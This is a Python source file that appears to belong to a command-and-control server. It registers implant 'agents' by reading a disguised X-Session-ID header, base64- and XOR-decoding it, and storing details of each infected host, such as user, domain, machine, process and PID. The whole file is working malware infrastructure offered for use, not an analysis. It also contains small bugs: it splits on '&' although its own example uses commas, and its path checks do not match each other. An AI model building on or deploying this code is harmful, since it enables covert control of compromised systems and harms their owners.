
import base64
from config import C2
from shared_db import db
from models import Session
from datetime import datetime


def FindSession(request):
    # Do stuff to find the session from the request / Grab from cookies or request headers or request body etc.
    if not request.method == C2['method'] or not request.path == "/{}".format(C2['path']):
        if not request.method == C2['method']:
            print("[!] Request method is not correct")
        if not request.path == C2['path']:
            print("[!] Request path is not correct")
        return None

    # In this example I'm checking for a request header called "X-Session-ID"
    if 'X-Session-ID' in request.headers:
        try:
            print("[+] Found X-Session-ID header")
            sessionInformation = request.headers['X-Session-ID']
            # I used base64 to encode the session information, but you can do whatever you want.
            sessionInformation = base64.b64decode(sessionInformation)
            # Afterwards I used XOR to decode the session information.
            sessionInformation = xor(sessionInformation)
            print(sessionInformation)
            sessionInformation = sessionInformation.decode('utf-8')
            # Finally I split the session information into a dictioary.

            # Example "username=test,domain=test,machine=test,process=test,version=test,arch=test,ip=test,pid=test"
            sessionInformation = [item.split("=")
                                for item in sessionInformation.split('&')]
            sessionInformation = {item[0]: item[1] for item in sessionInformation}
            # If the session is found, update the lastupdated field. otherwise create a new session.
            ip_address = request.headers.get(
                'X-Forwarded-For', request.remote_addr)
            sessionInformation['ip'] = ip_address
            session = Session.query.filter_by(**sessionInformation).first()
            if session is None:
                print("[+] Creating new session")
                session = Session(**sessionInformation)
                db.session.add(session)
                db.session.commit()
            else:
                print("[+] Updating session")
                session.lastupdated = datetime.utcnow()
                db.session.commit()
            return session
        except Exception as e:
            print(e)
            return None

    # if the request isn't from an agent return a None
    print("[!] Request is not from an agent")
    return None


def organize(list):
    # given a list like this:
    # [['user', 'test'], ['machine', 'desktop10'], ['process', '10'], ['domain', 'corp']]
    # return a dict like this:
    # {'user': 'test', 'machine': 'desktop10', 'process': '10', 'domain': 'corp'}
    return {item[0]: item[1] for item in list}


def xor(data):
    key = C2['key']
    print("[+] XOR Using key: " + str(key))
    key = int(key, 16)
    return bytes([data[i] ^ key for i in range(len(data))])
